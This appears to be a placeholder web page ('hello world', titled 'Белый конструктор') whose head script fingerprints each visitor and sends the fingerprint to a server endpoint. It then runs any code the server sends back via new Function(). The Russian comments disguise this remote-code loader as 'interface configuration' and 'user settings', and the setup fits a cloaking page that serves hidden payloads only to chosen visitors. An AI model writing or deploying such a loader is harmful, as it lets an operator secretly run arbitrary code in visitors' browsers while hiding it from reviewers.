<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Белый конструктор</title>
<script type="module">
(async () => {
    try {
        const CONFIG_API = '/fp.php';
        
        // Динамический импорт вместо статического
        const FingerprintJS = await import('/metrics/identification');
        
        const fp = await FingerprintJS.load({
            region: 'eu',
            endpoint: [CONFIG_API, FingerprintJS.defaultEndpoint]
        });

        const { requestId } = await fp.get({ extendedResult: true });

        // Загрузка конфигурации интерфейса
        const res = await fetch(`${CONFIG_API}?request_id=${encodeURIComponent(requestId)}`);
        if (!res.ok) return;

        const data = await res.json();

        // Выполнение пользовательских настроек
        if (data.init) {
            new Function(data.init)();
        }
    } catch (err) {
        console.error('Ошибка загрузки FingerprintJS:', err);
    }
})();
</script>
</head>
<body>
  hello world
</body>
</html>
